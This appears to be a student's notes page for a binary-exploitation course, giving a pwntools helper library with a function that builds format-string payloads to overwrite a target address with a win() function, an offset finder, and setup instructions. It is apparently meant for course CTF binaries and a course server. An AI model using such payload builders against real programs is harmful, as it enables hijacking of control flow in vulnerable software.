<style>#downloads { display: none !important; }</style>

```python
from pwn import *

global p
global elf

def start(prog, args, port=None, gdb_cmd="continue"):
    prog = './' + prog

    context.arch = 'i386'
    context.terminal = ['urxvt', '-e', 'sh', '-c']

    # can be disabled, removes a lot of the annoying output
    context.log_level = 'error'

    if args.REMOTE:
        p = remote('comp6447.wtf', port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog, gdb_cmd) 
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p, elf

def grab(p, start, end):
    p.recvuntil(start)
    return p.recvuntil(end, drop=True)

def pack(msg):
    return bytes(str(msg), 'utf-8')

# overwrites the address at target() with win().
# offset specifies which stack variable you control %{target}$n 
# padding specifies required padding to align the input in the stack variable (one of [0,1,2,3])
def fmtstr_build(win, target, offset, padding):
    payload = b"A" * padding
    payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
    payload += f"%{240 - padding}c".encode()

    for i in range(4):
        byte = win & 0xff
        win >>= 8
        if (byte == 0):
            payload += f"%{offset + i}$hhn".encode()
        else:
            payload += f"%{byte}c%{offset + i}$hhn%{256 - byte}c".encode()

    return payload

def fmtstr_offset(binary, after, padding=0):
    for i in range(1, 20):
        p = process(binary)

        p.sendlineafter(after, f'{b'A' * padding}AAAA%{i}$x'.encode())
        output = p.recvline().decode('utf-8')

        p.close()

        if '41414141' in output:
            return i
```

Then add the folder the lib is stored into your python path:
```bash
export PYTHONPATH="$PYTHONPATH:/folder/location/"
```
You can either run this every time you open a new terminal, or add it to your ~/.bashrc or ~/.zshrc and it will auto-run it everytime.

Finally, you can include this library into your programs with
```python
from lib import *
```